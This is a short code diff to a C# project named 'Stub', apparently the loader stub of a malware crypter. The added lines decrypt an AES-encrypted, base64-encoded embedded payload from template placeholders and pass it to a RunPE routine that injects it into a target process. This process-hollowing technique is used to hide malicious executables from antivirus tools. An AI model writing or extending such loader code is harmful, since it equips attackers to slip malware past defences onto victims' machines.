@@ -1,4 +1,5 @@
-﻿using System;
+﻿using Encryption;
+using System;
 using System.Diagnostics;
 using System.IO;
 using System.Runtime.InteropServices;
@@ -17,6 +18,10 @@ namespace Stub
         {
             byte[] key = Convert.FromBase64String("%KEY%");
             byte[] iv = Convert.FromBase64String("%IV%");
+            byte[] base64 = Convert.FromBase64String("%BASE64%");
+            byte[] deBase64Aes = AES.Decryption(base64, key, iv);
+
+            RunPE.RunPE.Execute("%INJECTION%", deBase64Aes);
         }
     }
 }
